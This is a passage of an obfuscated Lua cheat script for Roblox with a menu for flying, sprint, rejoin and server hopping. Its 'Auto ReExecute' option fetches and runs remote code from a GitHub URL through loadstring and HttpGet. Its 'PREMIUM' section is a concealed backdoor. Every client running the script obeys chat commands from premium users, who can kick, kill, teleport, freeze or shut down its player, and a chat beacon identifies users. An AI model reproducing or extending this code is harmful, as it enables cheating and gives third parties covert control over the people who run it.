			rawset(L_19_, "JumpMulti", 1);
		end
	end
})
local L_84_ = L_37_.Player:AddSlider("JumpPower", {
	Title = "Jump Multi",
	Default = 1,
	Min = 1,
	Max = 10,
	Rounding = 1,
	Callback = function(L_298_arg1)
	end
})

local L_85_ = L_37_.Player:AddToggle("AutoSprint", {
	Title = "Auto Sprint",
	Default = false,
	Callback = function(L_299_arg1)
		if L_299_arg1 then 
			repeat
				task.wait(.5)  
				rawset(L_18_, "SprintHolding", true);
			until not L_35_.AutoSprint.Value or not L_29_.Connected
		end
	end
})

local L_86_ = L_37_.Player:AddToggle("Fly", {
	Title = "Fly",
	Default = false,
	Callback = function(L_300_arg1)
	end
})

local L_87_ = 200
local L_88_ = false
local L_89_ = 100000000000000


local function L_90_func(L_301_arg1, L_302_arg2, L_303_arg3)
	local L_304_ = (L_302_arg2 - L_301_arg1)
	local L_305_ = L_304_.Magnitude
	return (L_304_ / L_305_) * L_303_arg3
end

local function L_91_func(L_306_arg1)
	local L_307_ = tostring(L_306_arg1):lower()
	local L_308_, L_309_ = L_307_:find("keycode.")
	return L_307_:sub(L_309_ + 1)
end

local L_92_ = {}

game.RunService.Heartbeat:connect(function()
	pcall(function()
		local L_310_ = L_7_.Character.Humanoid.RootPart
		local L_311_ = CFrame.new() + Vector3.new(0, 0, -L_89_)
		local L_312_ = CFrame.new() + Vector3.new(0, 0, L_89_)
		local L_313_ = CFrame.new() + Vector3.new(-L_89_, 0, 0)
		local L_314_ = CFrame.new() + Vector3.new(L_89_, 0, 0)
		local L_315_ = CFrame.new() + Vector3.new(0, L_89_, 0)
		local L_316_ = CFrame.new() + Vector3.new(0, -L_89_, 0)
		local L_317_ = Vector3.new()

		if L_35_.Fly.Value then
			if L_92_.w_active then
				L_317_ = L_317_ + L_90_func(L_310_.Position, (L_310_.CFrame * L_311_).Position, L_87_)
			end
			if L_92_.s_active then
				L_317_ = L_317_ + L_90_func(L_310_.Position, (L_310_.CFrame * L_312_).Position, L_87_)
			end
			if L_92_.a_active then
				L_317_ = L_317_ + L_90_func(L_310_.Position, (L_310_.CFrame * L_313_).Position, L_87_)
			end
			if L_92_.d_active then
				L_317_ = L_317_ + L_90_func(L_310_.Position, (L_310_.CFrame * L_314_).Position, L_87_)
			end
			if L_92_.space_active then
				L_317_ = L_317_ + Vector3.new(0, L_87_, 0)
			end
			if L_92_.leftcontrol_active then
				L_317_ = L_317_ - Vector3.new(0, L_87_, 0)  -- Apply downward velocity
			end
			L_310_.Velocity = L_317_
			L_310_.CFrame = CFrame.new(L_310_.Position, (workspace.CurrentCamera.CFrame * (CFrame.new() + Vector3.new(0, 0, -L_89_))).Position)
		end
	end)
end)

L_16_.InputBegan:connect(function(L_318_arg1, L_319_arg2)
	if L_319_arg2 then
		return
	end
	L_92_[L_91_func(L_318_arg1.KeyCode).."_active"] = true
end)

L_16_.InputEnded:connect(function(L_320_arg1)
	L_92_[L_91_func(L_320_arg1.KeyCode).."_active"] = false
end)

local L_93_ = L_37_.Server:AddToggle("AutoRejoin", {
	Title = "Auto Rejoin",
	Default = false,
	Callback = function(L_321_arg1)
		if L_321_arg1 then 
			L_34_:Notify({
				Title = 'Auto Rejoin',
				Content = 'You will rejoin if you are kicked or disconnected from the game',
				Duration = 5
			})
			repeat
				task.wait() 
				local L_322_, L_323_, L_324_ = game:GetService('Players').LocalPlayer, game.CoreGui.RobloxPromptGui.promptOverlay, game:GetService('TeleportService')
				L_323_.ChildAdded:connect(function(L_325_arg1)
					if L_325_arg1.Name == 'ErrorPrompt' then
						L_324_:Teleport(game.PlaceId)
						task.wait(2)
					end
				end)
			until L_35_.AutoRejoin.Value or not L_29_.Connected
		end
	end
})

local L_94_ = L_37_.Server:AddToggle("ReExecute", {
	Title = "Auto ReExecute",
	Default = false,
	Callback = function(L_326_arg1)
		if L_326_arg1 then 
			repeat
				task.wait()
				local L_327_ = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
				if L_327_ then
					L_327_('loadstring(game:HttpGet("https://raw.githubusercontent.com/13B8B/nexus/main/loadstring"))()')
				end  
			until not L_35_.ReExecute.Value or not L_29_.Connected
		end
	end 
})
L_37_.Server:AddButton({
	Title = "Rejoin-Server",
	Callback = function()
		game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
	end
})  
L_37_.Server:AddButton({
	Title = "Server-Hop", 
	Callback = function()
		local L_328_ = game:GetService("HttpService")
		local L_329_ = game:GetService("TeleportService")
		local L_330_ = "https://games.roblox.com/v1/games/"
		local L_331_, L_332_ = game.PlaceId, game.JobId
		local L_333_ = L_330_..L_331_.."/servers/Public?sortOrder=Desc&limit=100"
		local function L_334_func(L_336_arg1)
			local L_337_ = game:HttpGet(L_333_..((L_336_arg1 and "&cursor="..L_336_arg1) or ""))
			return L_328_:JSONDecode(L_337_)
		end
		local L_335_;
		repeat
			local L_338_ = L_334_func(L_335_)
			for L_339_forvar1, L_340_forvar2 in next, L_338_.data do
				if L_340_forvar2.playing < L_340_forvar2.maxPlayers and L_340_forvar2.id ~= L_332_ then
					local L_341_, L_342_ = pcall(L_329_.TeleportToPlaceInstance, L_329_, L_331_, L_340_forvar2.id, Player)
					if L_341_ then
						break
					end
				end
			end
			L_335_ = L_338_.nextPageCursor
		until not L_335_
	end
})

local L_95_ = game:GetService("HttpService")

local L_96_ = {}
do
	L_96_.Folder = "FLORENCE"
	L_96_.Settings = {
		Theme = "Dark",
		Acrylic = true,
		Transparency = true,
		MenuKeybind = "LeftControl"
	}

	function L_96_:SetFolder(L_343_arg1)
		self.Folder = L_343_arg1;
		self:BuildFolderTree()
	end

	function L_96_:SetLibrary(L_344_arg1)
		self.Library = L_344_arg1
	end

	function L_96_:BuildFolderTree()
		local L_345_ = {}

		local L_346_ = self.Folder:split("/")
		for L_347_forvar1 = 1, #L_346_ do
			L_345_[#L_345_ + 1] = table.concat(L_346_, "/", 1, L_347_forvar1)
		end

		table.insert(L_345_, self.Folder)
		table.insert(L_345_, self.Folder.."/settings")

		for L_348_forvar1 = 1, #L_345_ do
			local L_349_ = L_345_[L_348_forvar1]
			if not isfolder(L_349_) then
				makefolder(L_349_)
			end
		end
	end

	function L_96_:SaveSettings()
		writefile(self.Folder.."/options.json", L_95_:JSONEncode(L_96_.Settings))
	end

	function L_96_:LoadSettings()
		local L_350_ = self.Folder.."/options.json"
		if isfile(L_350_) then
			local L_351_ = readfile(L_350_)
			local L_352_, L_353_ = pcall(L_95_.JSONDecode, L_95_, L_351_)

			if L_352_ then
				for L_354_forvar1, L_355_forvar2 in next, L_353_ do
					L_96_.Settings[L_354_forvar1] = L_355_forvar2
				end
			end
		end
	end

	function L_96_:BuildInterfaceSection(L_356_arg1)
		assert(self.Library, "Must set InterfaceManager.Library")
		local L_357_ = self.Library
		local L_358_ = L_96_.Settings

		L_96_:LoadSettings()

		local L_359_ = L_356_arg1:AddSection("Interface")

		local L_360_ = L_359_:AddDropdown("InterfaceTheme", {
			Title = "Theme",
			Description = "Changes the interface theme.",
			Values = L_357_.Themes,
			Default = L_358_.Theme,
			Callback = function(L_362_arg1)
				L_357_:SetTheme(L_362_arg1)
				L_358_.Theme = L_362_arg1
				L_96_:SaveSettings()
			end
		})

		L_360_:SetValue(L_358_.Theme)

		if L_357_.UseAcrylic then
			L_359_:AddToggle("AcrylicToggle", {
				Title = "Acrylic",
				Description = "The blurred background requires graphic quality 8+",
				Default = L_358_.Acrylic,
				Callback = function(L_363_arg1)
					L_357_:ToggleAcrylic(L_363_arg1)
					L_358_.Acrylic = L_363_arg1
					L_96_:SaveSettings()
				end
			})
		end

		L_359_:AddToggle("TransparentToggle", {
			Title = "Transparency",
			Description = "Makes the interface transparent.",
			Default = L_358_.Transparency,
			Callback = function(L_364_arg1)
				L_357_:ToggleTransparency(L_364_arg1)
				L_358_.Transparency = L_364_arg1
				L_96_:SaveSettings()
			end
		})

		local L_361_ = L_359_:AddKeybind("MenuKeybind", {
			Title = "Minimize Bind",
			Default = L_358_.MenuKeybind
		})
		L_361_:OnChanged(function()
			L_358_.MenuKeybind = L_361_.Value
			L_96_:SaveSettings()
		end)
		L_357_.MinimizeKeybind = L_361_
	end
end

L_96_:SetLibrary(L_34_)
L_96_:SetFolder("FLORENCE")
L_96_:BuildInterfaceSection(L_37_.Settings)

L_33_:Load(L_27_)

----------// PREMIUM \\----------
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Kick",
	Callback = function()
		game.Players:Chat(".k "..getgenv().Selected)
	end 
})
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Kill",
	Callback = function()
		game.Players:Chat(". "..getgenv().Selected)
	end
})
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Teleport",
	Callback = function()
		game.Players:Chat(".b "..getgenv().Selected)
	end
})
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Shut Game Down",
	Callback = function()
		game.Players:Chat(".s "..getgenv().Selected)
	end
})
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Freeze",
	Callback = function()
		game.Players:Chat("- "..getgenv().Selected)
	end
})
Tab = premium == "premium" and L_37_.Premium:AddButton({
	Title = "Unfreeze",
	Callback = function()
		game.Players:Chat(".u "..getgenv().Selected)
	end
})

task.spawn(function()
	while task.wait() do 
		local L_365_ = game:GetService("Players")
		local L_366_ = game:GetService("TextChatService")
		local L_367_ = L_365_.LocalPlayer
		local L_368_ = L_367_.Name:gsub("_", "")

		for L_369_forvar1, L_370_forvar2 in ipairs(L_365_:GetPlayers()) do
			L_370_forvar2.Chatted:Connect(function(L_371_arg1)
				local L_372_, L_373_ = pcall(function()
					local L_374_ = L_371_arg1:gsub("_", "")
					if L_374_ == ".k "..L_368_ then
						game.Players.LocalPlayer:kick("nexus-premium user has kicked you")
					elseif L_374_ == ". "..L_368_ then
						game.Players.LocalPlayer.Character.Humanoid.Health = 0
					elseif L_374_ == ".b "..L_368_ then
						game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game.Players[L_370_forvar2.Name].Character.HumanoidRootPart.CFrame
					elseif L_374_ == ".s "..L_368_ then
						game:Shutdown()
					elseif L_374_ == "- "..L_368_ then
						game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					elseif L_374_ == ".u "..L_368_ then
						game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false    
					end  
				end)
			end) 
		end
	end 
end)

local L_97_ = {}
local L_98_ = {} 
local L_99_

local function L_100_func()
	if L_99_ then
		L_99_:SetValues(L_97_)
	end
end
local function L_101_func(L_375_arg1)
	for L_376_forvar1, L_377_forvar2 in ipairs(L_97_) do
		if L_377_forvar2 == L_375_arg1.Name then
			table.remove(L_97_, L_376_forvar1)
			L_98_[L_375_arg1] = nil
			L_100_func()
			break
		end
	end
end

game.Players.PlayerRemoving:Connect(function(L_378_arg1)
	L_101_func(L_378_arg1)
end)

task.spawn(function()
	while wait() do 
		for L_379_forvar1, L_380_forvar2 in ipairs(game.Players:GetPlayers()) do
			L_380_forvar2.Chatted:Connect(function(L_381_arg1)
				if L_381_arg1 == "nexus-is-back" and not L_98_[L_380_forvar2] then
					if not table.find(L_97_, L_380_forvar2.Name) and L_380_forvar2 ~= game.Players.LocalPlayer then
						local L_382_ = L_380_forvar2.Name:gsub("_", "")
						table.insert(L_97_, L_382_)
						print("Detected:", L_382_)
						L_98_[L_380_forvar2] = true  
						L_100_func() 
					end
				end  
			end) 
		end
	end
end)

L_99_ = premium == "premium" and L_37_.Premium:AddDropdown("Dropdown", {
	Title = "Select Nexus User",
	Values = L_97_, 
	Multi = false,
	Default = "",
	Callback = function(L_383_arg1)
		getgenv().Selected = L_383_arg1
	end
})

L_36_:SelectTab(1)
